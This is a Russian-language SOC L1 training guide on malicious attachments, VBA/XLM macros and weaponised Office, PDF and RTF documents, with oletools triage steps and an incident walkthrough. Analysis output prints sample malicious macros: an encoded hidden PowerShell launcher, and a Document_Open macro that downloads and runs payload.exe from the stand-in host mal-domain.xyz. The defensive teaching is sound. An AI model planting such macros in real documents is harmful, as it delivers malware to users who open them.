# Вредоносные вложения, макросы и документы

## Вредоносные вложения

### Контекст и базовые понятия

Вредоносное вложение — это файл, доставляемый получателю по электронной почте (или через иные каналы, такие как мессенджеры, облачные хранилища) и содержащий код или эксплойт, предназначенный для компрометации системы при открытии. Вложения остаются одним из основных векторов начального проникновения, что подтверждается отчётом Verizon DBIR, где 94% расследованных утечек начинались с фишингового письма, а по данным Symantec, 48% всех вредоносных вложений — это файлы Microsoft Office. В рамках MITRE ATT&CK этому соответствует (ныне упразднённая, но исторически значимая) техника T1193 Spearphishing Attachment.

Фундаментальное отличие вредоносного вложения от других методов доставки полезной нагрузки (drive-by download, эксплуатация уязвимостей на веб-серверах) заключается в активном участии пользователя: он должен открыть файл, а во многих случаях — дополнительно разрешить выполнение содержимого (например, активировать макросы). Именно эта особенность сближает вредоносные вложения с техникой социальной инженерии, делая их мощным инструментом целевых и массовых атак.

Чтобы аналитик SOC L1 мог правильно классифицировать поступающие образцы, необходимо различать типы файлов, наиболее часто используемых в качестве вредоносных вложений. В таблице ниже приведён обзор с ключевыми характеристиками, позволяющими первично оценить потенциальную опасность.

| Тип вложения | Расширения | Типичное вредоносное содержимое | Характерные индикаторы |
|--------------|------------|-------------------------------|------------------------|
| Документы Microsoft Office (OLE) | `.doc`, `.xls`, `.ppt` | VBA-макросы, OLE-объекты с PE-файлами, эксплуатация Equation Editor (CVE-2017-11882) | Наличие макросов, подозрительные потоки, старый формат файла |
| Документы Office Open XML | `.docm`, `.xlsm`, `.pptm` | VBA-макросы, внедрённые OLE-объекты | Расширение с 'm' — признак наличия макросов, открывается как ZIP |
| PDF | `.pdf` | JavaScript, встроенные исполняемые файлы, ссылки на фишинговые страницы, эксплойты ридера | Наличие /JavaScript, /Launch, /EmbeddedFile, нестандартные объекты |
| Архивы | `.zip`, `.rar`, `.7z`, `.iso` | Исполняемые файлы, скрипты, документы с макросами | Внутри архива ожидаются PE-файлы, скрипты PowerShell, VBScript; парольная защита типична |
| Исполняемые файлы | `.exe`, `.dll`, `.scr` | Напрямую доставляют вредоносную программу (трояны, загрузчики) | Редко проходят через почтовые фильтры, часто маскируются под двойное расширение |
| Скрипты | `.vbs`, `.js`, `.wsf`, `.hta` | Интерпретируемый код, загружающий и выполняющий следующую стадию | Высокая энтропия, обфускация, вызов WScript.Shell, PowerShell |

С точки зрения жизненного цикла атаки вредоносное вложение появляется на стадии *доставки* (Delivery) и требует *исполнения* (Execution). При получении файла SOC L1 следует исходить из предположения, что пользователь уже мог открыть вложение; задача аналитика — оперативно определить характер угрозы, блокировать её распространение и инициировать изоляцию узла.

```text
[Злоумышленник] ─── (фишинговое письмо с .docm) ──▶ [Почтовый шлюз]
                        │
               ┌────────┴────────┐
               ▼                  ▼
        [Песочница]        [Почтовый ящик жертвы]
               │                  │
        (анализ вложения)   (открытие документа)
               │                  │
        ┌──────┴──────┐     ┌─────┴─────┐
        │ Блокировка  │     │ Включение │
        │   угрозы    │     │ макросов  │
        └─────────────┘     └───────────┘
                                   │
                         ┌─────────┴─────────┐
                         ▼                     ▼
                   [Выполнение пейлоада] [Запрос C2]
```

Рисунок иллюстрирует общий путь прохождения вредоносного вложения в корпоративной среде. Почтовый шлюз с функцией «песочницы» может перехватить документ до попадания к пользователю, но злоумышленники постоянно совершенствуют методы обхода, включая задержку выполнения, обфускацию и интерактивные приёмы социальной инженерии.

### Внутреннее устройство

Основной интерес с точки зрения анализа представляют две категории форматов: **составные бинарные документы OLE** (Object Linking and Embedding) и **Office Open XML (OOXML)**. Документы старых форматов (DOC, XLS) построены на базе Compound File Binary Format — файловой системы внутри файла, организованной в виде потоков и хранилищ. Вредоносный код чаще всего находится в потоке `Macros` (для VBA) или во внедрённом OLE-объекте (например, `\x01Ole10Native`, содержащем PE-файл). Именно этот поток может распаковываться и исполняться макросом или напрямую при открытии, если документ содержит уязвимость типа CVE-2017-11882 в редакторе формул.

Документы нового формата (DOCX, XLSX) являются ZIP-архивом, включающим XML-файлы и, при наличии макросов, бинарный файл `word/vbaProject.bin`. Этот файл содержит всю VBA-среду и извлекается штатными средствами unzip. Вредоносные объекты могут также внедряться как OLE-пакеты (Embedded Package) внутри документа, сохраняясь в папке `embeddings`.

Ниже приведена иллюстративная схема структуры вредоносного файла Word с макросом и внедрённым исполняемым объектом (на примере DOCM):

```text
Архив invoice.docm
│
├── [Content_Types].xml
├── word/
│   ├── document.xml          ← основное содержимое
│   ├── vbaProject.bin        ← бинарный контейнер VBA
│   ├── embeddings/
│   │   └── oleObject1.bin    ← внедрённый объект (может быть PE)
│   └── media/                ← изображения, используемые в документе
├── docProps/
│   └── app.xml, core.xml
└── _rels/
    └── .rels
```

Аналитик SOC L1 может быстро оценить подозрительность документа, проверив наличие папки `word/embeddings` и файла `vbaProject.bin`. Например, обычный документ без макросов (DOCX) не содержит `vbaProject.bin`. Присутствие этого файла в документе, пришедшем из внешней сети, само по себе является основанием для углублённой проверки.

### Применение и работа с вредоносными вложениями на уровне SOC L1

Первичный анализ вредоносного вложения в SOC L1 начинается с триажа. Необходимо, не запуская документ в продуктивной среде, ответить на несколько вопросов:
- Имеет ли файл признаки содержания макросов или встроенных объектов?
- Присутствуют ли известные эксплойты (например, CVE-2017-11882)?
- Какие сетевые индикаторы (URL, IP-адреса) извлекаются из статического анализа?

Инструменты командной строки из состава `oletools` (Python) позволяют быстро провести статический анализ документа OLE и OOXML. Рассмотрим типичный рабочий процесс.

**Шаг 1. Определение типа и риск-факторов файла с помощью `oleid`**  
Эта утилита анализирует OLE-файл и выдаёт набор флагов, указывающих на потенциально опасные характеристики.

```bash
oleid suspicious_invoice.doc
```
*Ожидаемый вывод (фрагмент):*
```
Filename: suspicious_invoice.doc
...
--------------------+-----+-----+-----+----------------------------
Indicator           |Value|Risk |Description
--------------------+-----+-----+-----+----------------------------
Has VBA Macros      |True |HIGH |This file contains VBA macros. ...
Has OLE object      |True |MED  |Contains an OLE object. ...
Flash objects       |False|NONE |...
--------------------+-----+-----+-----+----------------------------
```

**Шаг 2. Извлечение и анализ VBA-макросов с помощью `olevba`**  
`olevba` извлекает все модули VBA из документа и может выполнять эвристическое обнаружение подозрительных вызовов (например, `Shell`, `URLDownloadToFile`, `Powershell`).

```bash
olevba --decode suspicious_invoice.doc
```
*Фрагмент вывода:*
```vb
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -NoP -W Hidden -Enc JABzAD0AJwBpAHQAYQBsAHkAIgA7..."
End Sub
```
В примере видно: макрос запускается автоматически при открытии (`AutoOpen`), создаёт объект `WScript.Shell` и выполняет закодированную команду PowerShell. Параметр `-Enc` указывает на Base64-кодирование, что типично для обфускации. Декодирование строки (средствами `CyberChef` или `base64 -d`) выявит дальнейший сценарий загрузки.

**Шаг 3. Поиск внедрённых объектов**  
Если `oleid` показал наличие OLE-объектов, можно извлечь их с помощью `oleobj`:

```bash
oleobj suspicious_invoice.doc
```
*Вывод может содержать пути к извлечённым объектам и их типы.* Наличие объекта с сигнатурой MZ (исполняемый файл) однозначно свидетельствует о вредоносности.

Даже такой поверхностный статический анализ без запуска документа в песочнице даёт аналитику первого уровня достаточно информации для принятия решения об эскалации инцидента и блокировки индикаторов. Важно помнить, что злоумышленники часто применяют обфускацию: имена переменных зашумлены, код разделён на множество функций, строки динамически собираются. В таких случаях ручной анализ VBA дополняется автоматизированными песочницами, но именно навыки чтения VBA-кода позволяют распознать попытки обхода.

## Макросы

### Контекст и базовые понятия

Макрос — это небольшая программа, встроенная в документ Microsoft Office, написанная на языке Visual Basic for Applications (VBA). Изначально макросы создавались для автоматизации рутинных операций: форматирования текста, вычислений в Excel, генерации отчётов. Однако те же возможности исполнения произвольного кода делают макросы мощным инструментом атакующих. Согласно отчёту Microsoft, 98% угроз, нацеленных на Office, используют макросы. Злоумышленник, убедив жертву включить выполнение макросов, получает полный доступ к локальной системе: команды VBA могут читать и записывать файлы, обращаться к реестру, запускать процессы и загружать дополнительные компоненты.

Эволюция макроугроз прошла путь от безобидных шуток до сложных многоступенчатых атак. Первый широко известный макро-вирус **Melissa** (1999) рассылал себя через Outlook всем контактам, нарушая работу почтовых серверов. Современные кампании, такие как Dridex, Emotet и TrickBot, использовали макросы для начального заражения, а затем загружали модули-вымогатели или банковские трояны (например, FlawedAmmyy RAT, распространявшийся через файлы XLS в 2019 году). С точки зрения SOC L1 важно не только понимать саму технологию, но и уметь отличать легитимные макросы от вредоносных.

**Сравнение легитимного и вредоносного макроса**

| Характеристика | Легитимный макрос | Вредоносный макрос |
|----------------|-------------------|---------------------|
| Источник | Создан внутри организации, подписан доверенным сертификатом | Поступает из внешней сети, не подписан |
| Поведение | Операции с ячейками, форматирование, вычисления | Создание объектов WScript.Shell, вызов PowerShell, загрузка файлов из интернета |
| Триггеры | Назначенные кнопки, пользовательские события | `AutoOpen`, `Document_Open`, `Workbook_Open` |
| Код | Чистый, читаемый, документированный | Сильно обфусцирован, декодирование Base64/Hex, бессмысленные имена переменных |
| Сетевые запросы | Отсутствуют (внутренние источники данных — редкость) | Загрузка следующего этапа с внешнего URL, обращение к C2 |

С 2022 года Microsoft поэтапно внедряет блокировку макросов, загруженных из Интернета, по умолчанию. Это означает, что пользователи Office 365 и современных версий Office не увидят привычного предупреждения, а получат уведомление о блокировке без возможности легко включить макрос. Данная мера значительно сократила поверхность атаки, однако злоумышленники адаптируются, используя контейнеры ISO, ZIP с паролем и другие обходные пути, а также социальную инженерию, принуждающую скопировать файл на локальный диск, где ограничение может не действовать.

### Внутреннее устройство макросов

VBA-макросы хранятся внутри документа в виде бинарного контейнера **vbaProject.bin**. Этот контейнер, в свою очередь, является файлом составного формата (OLE Compound File), содержащим потоки с исходными кодами модулей, байт-кодом (P-code) и метаинформацией о проекте. При открытии документа офисное приложение загружает этот бинарный образ и интерпретирует VBA-код. Жизненный цикл выполнения макроса в упрощённом виде выглядит так:

```text
[Открытие документа] ──▶ [Загрузка vbaProject.bin] ──▶ [Инициализация VBA-среды]
          │                                           │
          └──▶ [Срабатывание AutoOpen / Document_Open] ◀──┘
                         │
                         ▼
                [Выполнение VBA-инструкций: вызов Shell, CreateObject, создание HTTP-запроса]
                         │
                         ▼
                [Запуск дополнительной нагрузки — PowerShell, cmd.exe, regsvr32]
```

Вредоносные функции часто прибегают к следующим техникам:
- **Обфускация**: искажение имён переменных, разбиение строк, кодирование в Base64 или XOR.
- **Динамическая загрузка**: код, сохранённый в XML-части документа или в свойствах, считывается в рантайме.
- **WMI-выполнение**: использование объектов WMIService для запуска процессов с повышенными привилегиями.
- **Reflective loading**: загрузка сборок.NET прямо из памяти, избегая мониторинга файловой системы.

Примеры вредоносных вызовов, наличие которых в макросе должно расцениваться как HIGH-алерт:
- `CreateObject("Microsoft.XMLHTTP")` — HTTP-запросы.
- `CreateObject("WScript.Shell").Run` — запуск командной строки.
- `CreateObject("Shell.Application").ShellExecute` — выполнение файлов.
- `MSHTA`, `regsvr32`, `rundll32` в аргументах.

```text
Структура модуля VBA:
Module1 (name="NewMacros")
├── Attributes
├── Source code (VBA)
│   ├── Sub AutoOpen()
│   │   └── Dim obj As Object
│   │       Set obj = CreateObject("MSXML2.ServerXMLHTTP")
│   │       obj.Open "GET", "http://<malicious>/payload.exe", False
│   │       obj.Send
│   │       ...
│   └── Function DecodeBase64(str) ...
└── Streams:
    ├── _VBA_PROJECT
    ├── dir
    └── __SRP_*
```

Аналитик может извлечь эту структуру с помощью инструментов, рассмотренных ниже.

### Применение: анализ макросов в SOC L1

При поступлении документа с макросами первая задача — извлечь исходный код и выявить признаки автоматического выполнения и вредоносных намерений. Инструмент **olevba** из пакета oletools остаётся основным.

**Пример: детектирование вредоносного макроса**

```bash
olevba --deobf --reveal suspicious.docm
```
*Вывод:*
```
olevba 0.60 on Python 3.10.6 - http://decalage.info/python/oletools
===============================================================================
FILE: suspicious.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub Document_Open()
    Dim yVRBm As String
    yVRBm = "Pow" & "er" & "She" & "ll -Nop -Wind 1 -ex Bypass -Enc "
    ' ... обфусцированная сборка строки
    Call Shell(yVRBm & EncodedCommand, 0)
End Sub
-------------------------------------------------------------------------------
+----------+--------------------+---------------------------------------------+
| Type     | Keyword            | Description                                 |
+----------+--------------------+---------------------------------------------+
| AutoExec | Document_Open      | Runs when the Word document is opened        |
| Suspicious| Shell             | May run an executable file or a system ...  |
| Suspicious| Powershell        | May run PowerShell commands                  |
| Base64   | EncodedCommand     | Command encoded in Base64                    |
+----------+--------------------+---------------------------------------------+
```

Здесь `olevba` не только извлёк код, но и автоматически классифицировал подозрительные ключевые слова: `AutoExec`, `Shell`, `Powershell`, `Base64`. Для аналитика это однозначный маркер вредоносной активности. Следующий шаг — декодировать `EncodedCommand` с помощью `base64 -d` или CyberChef и извлечь из неё сетевые индикаторы (URL, IP). Полученные IoC немедленно вносятся в SIEM для блокировки.

Если макрос динамически собирает команду (например, используя `ChrW`), ручное декодирование может быть трудоёмким. В таких случаях применяется **ViperMonkey** — эмулятор VBA на Python, способный частично эмулировать выполнение макроса и извлечь расшифрованные строки и URL. Интеграция таких скриптов в систему песочницы автоматизирует обработку и ускоряет реагирование.

## Документы

### Контекст: документ как контейнер угрозы

Под документом в контексте компьютерных атак понимается файл офисного или читаемого формата, который используется для первичной доставки вредоносной нагрузки. Помимо классических форматов Microsoft Office (DOC, DOCX, XLS, XLSM, PPT) сюда включаются PDF, Rich Text Format (RTF) и скомпилированные HTML-файлы справки (CHM). Объединяет их способность содержать активное содержимое — макросы, сценарии, внедрённые объекты — или эксплуатировать уязвимости приложений-обработчиков.

Злоумышленники выбирают тип документа, исходя из целевой аудитории и предполагаемого вектора атаки. Массовые фишинговые рассылки часто используют PDF с встроенными фишинговыми ссылками или JavaScript, так как этот формат воспринимается пользователями как безопасный. Целевые атаки (spear phishing) нередко прибегают к документам Office с макросами и эксплуатацией известных уязвимостей, таких как CVE-2017-11882 (Equation Editor) или CVE-2018-0802 (память Equation Editor), позволяющих добиться выполнения кода без дополнительных действий пользователя.

Ниже в таблице систематизированы основные форматы документов и характерные для них угрозы.

| Формат | Метод доставки вредоносной нагрузки | Уязвимости (CVE) | Индикаторы статического анализа |
|--------|------------------------------------|------------------|--------------------------------|
| RTF (.rtf) | Внедрённые OLE-объекты, CFB-потоки с эксплойтами | CVE-2017-11882, CVE-2018-0802 | Наличие объекта `objupdate` или класса `Equation.3` |
| DOC (.doc) | VBA-макросы, OLE-объекты с PE | CVE-2015-1641 (Microsoft Office) | Потоки `Macros`, `Ole10Native` |
| DOCX/DOCM | VBA-макросы (DOCM), OLE-пакеты | CVE-2021-40444 (MSHTML) | `vbaProject.bin`, `embeddings/oleObject.bin` |
| XLS/XLSM | VBA-макросы, XLM-макросы (Excel 4.0) | CVE-2019-0808 (другой контекст) | Наличие листов `Macro1` с XLM-формулами |
| PDF | JavaScript, встроенные файлы, ссылки | CVE-2018-4990 (Adobe Reader) | Объекты `/JavaScript`, `/EmbeddedFile`, `/Launch` |
| CHM (.chm) | Выполнение скриптов при открытии страниц справки | – | Файлы `.hhc`, встроенный скрипт в HTML |

Особое место занимают **XLM-макросы** (Excel 4.0 Macros). В отличие от VBA, они записываются прямо в ячейки листа в виде формул (например, `=CALL("urlmon","URLDownloadToFileA",...)`) и не требуют отдельного контейнера `vbaProject.bin`. Такая техника использовалась в кампаниях ZLoader, Agent Tesla и других, уходя от сигнатур, ориентированных на VBA.

### Внутреннее устройство документов с вредоносным содержимым

Глубокое понимание внутренней структуры документа позволяет аналитику эффективно извлекать подозрительные элементы. Рассмотрим три ключевых формата: DOCX (OOXML), PDF и RTF.

**DOCX/DOCM (Office Open XML)**  
Как упоминалось ранее, это ZIP-архив, содержащий XML и бинарные объекты. Вредоносный код может прятаться в:
- `vbaProject.bin` — макросы VBA.
- `word/embeddings/oleObject.bin` — внедрённый объект, который макрос может извлечь и запустить.
- `word/activeX/` — ActiveX-элементы, способные загружать внешний контент.
- `customXml/` — пользовательские XML-данные, иногда содержащие стеганографически закодированный пейлоад.

Схема расположения вредоносных компонентов в фишинговом документе:

```text
DOCX-архив (переименовать в .zip)
│
├── word/
│   ├── document.xml          ← отображаемый текст-приманка
│   ├── vbaProject.bin        ← VBA-проект с AutoOpen
│   ├── embeddings/
│   │   └── oleObject1.bin    ← исполняемый файл (MZ-сигнатура)
│   └── theme/
├── docProps/
└── _rels/
```

При аналитическом извлечении (`unzip`) команда `file oleObject1.bin` может выдать `PE32 executable (GUI) Intel 80386`, что является верным признаком атаки.

**PDF**  
Формат PDF состоит из объектов (Object), организованных в древовидную структуру. Вредоносный код может быть размещён в объектах типа:
- `/JavaScript` — сценарий, выполняющийся при открытии файла (если разрешено в настройках ридера).
- `/EmbeddedFile` — внедрённый файл (например, PE, VBS), который может быть извлечён и запущен скриптом.
- `/Launch` — инструкция запустить внешнее приложение или открыть URL.
- `/OpenAction` — автоматическое действие при открытии.

Анализ PDF-документа начинается с извлечения дерева объектов с помощью `pdfid.py` и `pdf-parser.py`.

**RTF**  
RTF — текстовый формат с управляющими словами. Вредоносные фрагменты часто оборачиваются в группы `{\object\obj...}`, включающие бинарные данные OLE и указание на уязвимый класс (например, `{\object\objemb\objclass Equation.3}`). Для анализа RTF-документов незаменим инструмент `rtfobj.py`, который выделяет OLE-объекты и может выявить эксплуатацию известных уязвимостей.

### Применение: анализ документов в SOC L1

Для SOC L1 принципиально иметь автоматизированные средства первичной проверки всех подозрительных документов. Ниже приведены практические команды для трёх распространённых форматов.

**Анализ PDF с помощью pdfid и pdf-parser**

```bash
pdfid.py suspicious.pdf
```
*Вывод (сокращён):*
```
PDFiD 0.2.7 suspicious.pdf
 PDF Header: %PDF-1.5
 obj                    14
 endobj                 14
 stream                  4
 ...
 /JavaScript             1       !!!
 /JS                     0
 /EmbeddedFile           0
 /Launch                 0
 /OpenAction             1       !!!
 /AA                     0
```
Флаги `!!!` на строках `/JavaScript` и `/OpenAction` указывают на высокую вероятность вредоносности. Дальнейший анализ конкретного объекта:

```bash
pdf-parser.py --search JavaScript suspicious.pdf
```
*Результат (иллюстративная схема):*
```
obj 12 0
 Type: /Action
 /S /JavaScript /JS (app.alert(“XSS”))
```
Обнаруженный скрипт может быть безобидным, но в реальных атаках часто содержит обфусцированный код для скачивания и выполнения пейлоада.

**Анализ RTF с помощью rtfobj**

```bash
rtfobj.py malicious.rtf
```
*Вывод (схематично):*
```
rtfobj 0.57 - http://decalage.info/python/oletools
====================================================
File: 'malicious.rtf' - size: ... bytes
---+----------+------------+------------------
id |index     |OLE object  |OLE package
---+----------+------------+------------------
0  |00004E10h |format_id: 2|Not an OLE package
   |          |class name: 'Equation.3'
   |          |data size:  3584 bytes
   |          |MD5:        abcdef...
---+----------+------------+------------------
```
Наличие объекта с именем класса `Equation.3` — классический признак попытки эксплуатации CVE-2017-11882. В таком случае аналитик должен немедленно эскалировать инцидент и проверить наличие обновлений на узлах отправителя и получателя.

**Расширенная проверка макросов и внедрённых объектов**

Для Office-документов можно объединить все этапы в одной команде:

```bash
olevba -a --decode suspicious.docm && oleobj suspicious.docm
```
Это позволяет одновременно получить декодированные макросы и извлечь внедрённые объекты. Обнаруженные исполняемые файлы отправляются на динамический анализ в песочницу.

Важный практический аспект: пользователи часто получают вложения в архивах (ZIP), защищённых паролем. Пароль обычно указан в теле письма, что помогает обходить автоматические сканеры. Аналитик SOC L1, получив такой образец, должен извлечь содержимое с помощью пароля и повторить статический анализ. Процедура должна быть задокументирована в плане реагирования, поскольку такие инциденты встречаются регулярно.

## Сквозной практический пример: обработка инцидента с вредоносным документом

**Исходные условия:** Сотрудник компании получил электронное письмо с темой «Срочный счёт на оплату» и вложением `INVOICE_20250401.docm`. Письмо содержит текст, убеждающий открыть документ и включить редактирование (Enable Editing). Сотрудник переслал письмо в SOC через тикет. Уровень аналитика — L1. Рабочая станция — Windows 10, установлен Python с пакетом oletools.

**Шаг 1. Первичная оценка файла**

Извлечение файла из письма в безопасную среду (не открывая в Office). Определяем тип:

```bash
file INVOICE_20250401.docm
```
*Ожидаемый вывод:*
```
INVOICE_20250401.docm: Microsoft Word 2007+
```
Расширение `.docm` уже указывает на наличие макросов. Далее используем `oleid`:

```bash
oleid INVOICE_20250401.docm
```
*Вывод:*
```
Indicator           |Value|Risk |Description
--------------------+-----+-----+---------------------------
Has VBA Macros      |True |HIGH |This file contains VBA...
Encrypted           |False|NONE |
--------------------+-----+-----+---------------------------
```
Высокий риск подтверждён: есть макросы.

**Шаг 2. Извлечение и анализ VBA-макросов**

```bash
olevba --deobf --reveal INVOICE_20250401.docm
```
*Вывод (ключевой фрагмент):*
```
VBA MACRO ThisDocument.cls
Sub Document_Open()
    Dim strPayloadURL As String
    strPayloadURL = "h" & "t" & "t" & "p" & ":" & "//" & "mal-domain.xyz/dl/payload.exe"
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", strPayloadURL, False
    objHTTP.Send
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile "C:\Users\Public\payload.exe", 2
    CreateObject("WScript.Shell").Run "C:\Users\Public\payload.exe"
End Sub
+----------+--------------------+---------------------------------------------+
| Type     | Keyword            | Description                                 |
+----------+--------------------+---------------------------------------------+
| AutoExec | Document_Open      | Runs when the Word document is opened        |
| Susp     | CreateObject       | May create an OLE object                     |
| Susp     | MSXML2.XMLHTTP     | May download files from the internet         |
| Susp     | ADODB.Stream       | May write downloaded data to a file          |
| Susp     | WScript.Shell      | May run commands or executables              |
+----------+--------------------+---------------------------------------------+
```
Аналитик визуально идентифицирует URL загрузки, сохранение пейлоада на диск и его выполнение. Индикаторы для блокировки:
- `mal-domain.xyz` (домен)
- `http://mal-domain.xyz/dl/payload.exe` (URL)
- `payload.exe` (имя файла, хеш пока неизвестен)

**Шаг 3. Извлечение сетевых IoC и проверка репутации**

Сохраняем извлечённые индикаторы из макроса. Проверяем IP-адрес домена `nslookup mal-domain.xyz` и сверяем с TI-платформами. Предположим, домен имеет негативную репутацию и связан с известной кампанией Emotet.

**Шаг 4. Опциональный динамический анализ в песочнице**

Документ отправляется в изолированную среду (Cuckoo, Any.Run). После запуска песочница подтверждает HTTP-запрос к указанному URL и последующее выполнение загруженного бинарника. В логах появляется:
```
GET /dl/payload.exe HTTP/1.1
Host: mal-domain.xyz
...
```
Песочница фиксирует создание файла `C:\Users\Public\payload.exe` и его запуск, а также дальнейшие сетевые соединения на C2-сервер.

**Шаг 5. Формирование оповещения и эскалация**

На основе полученных данных создаётся инцидент с уровнем Critical. В SIEM вносятся правила блокировки домена и URL, а также хеша `payload.exe` (если получен из песочницы). Инициируется процедура изоляции рабочей станции пользователя-получателя, запускается полное сканирование антивирусом.

Таким образом, сквозной пример демонстрирует полный цикл реагирования SOC L1 на фишинговое вложение с вредоносным макросом: от статического анализа до извлечения индикаторов и эскалации.
